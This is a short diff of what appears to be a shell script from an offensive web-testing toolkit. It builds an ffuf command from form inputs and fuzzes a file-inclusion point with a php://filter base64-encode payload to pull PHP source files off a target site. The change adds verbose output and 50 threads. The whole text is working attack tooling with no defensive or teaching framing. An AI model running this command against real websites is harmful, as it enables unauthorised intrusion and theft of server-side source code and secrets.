@@ -16,5 +16,5 @@ WEBSITE=${form_data["website"]}
 WORDLIST=${form_data["wordlist"]}
 PATH_PREFIX=${form_data["path_prefix"]}
 
-execute_command "ffuf -w ${WORDLIST}:FILE -u '${WEBSITE}php://filter/read=convert.base64-encode/resource={$PATH_PREFIX}FILE.php' -fs 0"
+execute_command "ffuf -w ${WORDLIST}:FILE -u '${WEBSITE}php://filter/read=convert.base64-encode/resource={$PATH_PREFIX}FILE.php' -v -t 50 -fs 0"
 create_new_line
